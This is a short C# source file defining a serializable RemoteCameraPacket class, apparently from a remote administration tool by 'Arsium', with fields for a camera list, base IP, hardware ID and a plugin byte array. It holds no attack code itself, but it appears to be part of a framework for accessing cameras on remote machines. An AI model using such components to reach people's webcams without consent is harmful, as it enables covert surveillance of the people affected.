using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RemoteCameraPacket : IPacket
    {
        public RemoteCameraPacket() : base()
        {
            this.PacketType = PacketType.RC_GET_CAM;
        }

        public RemoteCameraPacket(List<string> cameras, string baseIp, string HWID) : base()
        {
            this.PacketType = PacketType.RC_GET_CAM;          
            this.BaseIp = baseIp;
            this.HWID = HWID; 
            
            this.cameras = cameras;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<string> cameras { get; set; }
    }
}
